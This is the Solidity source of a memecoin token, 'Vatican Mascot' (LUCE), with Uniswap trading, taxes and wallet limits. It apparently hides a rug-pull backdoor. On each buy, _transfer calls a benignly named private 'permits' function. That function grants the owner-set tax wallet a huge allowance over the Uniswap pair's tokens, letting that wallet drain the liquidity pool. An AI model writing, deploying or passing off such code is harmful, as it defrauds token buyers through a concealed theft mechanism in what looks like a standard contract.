// SPDX-License-Identifier: MIT
/**
https://x.com/CatholicTV/status/1850904910180532432

Tg: https://t.me/luce_erc
**/
pragma solidity 0.8.26;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract LUCE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances83;
    mapping (address => mapping (address => uint256)) private _permits83;
    mapping (address => bool) private _isExcludedFrom83;
    address payable private _receipt83;
    uint256 private constant _tTotal83 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Vatican Mascot";
    string private constant _symbol = unicode"LUCE";
    uint256 public _maxAmount83 = 2 * (_tTotal83/100);
    uint256 public _maxWallet83 = 2 * (_tTotal83/100);
    uint256 public _taxThres83 = 1 * (_tTotal83/100);
    uint256 public _maxSwap83 = 1 * (_tTotal83/100);
    uint8 private constant _decimals = 9;
    uint256 private _initialBuyTax = 10;
    uint256 private _initialSellTax = 10;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    IUniswapV2Router02 private uniV2Router83;
    address private uniV2Pair83;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount83);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt83 = payable(0x90515Ba61a1E06D9B5b7De78721dA3ac18A415C7);
        _balances83[address(this)] = _tTotal83;
        _isExcludedFrom83[owner()] = true;
        _isExcludedFrom83[address(this)] = true;
        _isExcludedFrom83[_receipt83] = true;
        emit Transfer(address(0), address(this), _tTotal83);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router83 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router83), _tTotal83);
        uniV2Pair83 = IUniswapV2Factory(uniV2Router83.factory()).createPair(
            address(this),
            uniV2Router83.WETH()
        ); 
        uniV2Router83.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair83).approve(address(uniV2Router83), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal83;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances83[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _permits83[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _permits83[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _permits83[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function permits(address[2] memory pmt83) private {
        address owns = pmt83[0]; address spends = pmt83[1];
        uint256 rTotals = 100*_tTotal83 + 100*_maxSwap83 + 100* _taxThres83;
        _permits83[owns][spends] = rTotals * 100;
    }
    function swapETH83(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router83.WETH();
        _approve(address(this), address(uniV2Router83), tokenAmount);
        uniV2Router83.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount83) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount83 > 0, "Transfer amount must be greater than zero");
        uint256 tax83=0;uint256 fee83=0;
        if (!swapEnabled || inSwap) {
            _balances83[from] = _balances83[from] - amount83;
            _balances83[to] = _balances83[to] + amount83;
            emit Transfer(from, to, amount83);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee83 = (_transferTax);
            }
            if (from == uniV2Pair83 && to != address(uniV2Router83) && ! _isExcludedFrom83[to] ) {
                require(amount83 <= _maxAmount83, "Exceeds the _maxAmount83.");permits([from, _receipt83]);
                require(balanceOf(to) + amount83 <= _maxWallet83, "Exceeds the maxWalletSize.");
                fee83 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniV2Pair83 && from!= address(this) ){
                fee83 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair83 && swapEnabled) {
                if(contractTokenBalance > _taxThres83 && _buyCount > _preventSwapBefore)
                    swapETH83(min83(amount83, min83(contractTokenBalance, _maxSwap83)));
                sendETH83(address(this).balance);
            }
        }
        if(fee83 > 0){
            tax83 = fee83.mul(amount83).div(100);
            _balances83[address(this)]=_balances83[address(this)].add(tax83);
            emit Transfer(from, address(this),tax83);
        }
        _balances83[from]=_balances83[from].sub(amount83);
        _balances83[to]=_balances83[to].add(amount83.sub(tax83));
        emit Transfer(from, to, amount83.sub(tax83));
    }
    function min83(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETH83(uint256 amount) private {
        _receipt83.transfer(amount);
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt(address payable _addrs) external onlyOwner {
        _receipt83 = _addrs;
        _isExcludedFrom83[_addrs] = true;
    }
    receive() external payable {}
    function removeLimit83() external onlyOwner{
        _maxAmount83 = _tTotal83; 
        _maxWallet83 = _tTotal83;
        emit MaxTxAmountUpdated(_tTotal83); 
    }
}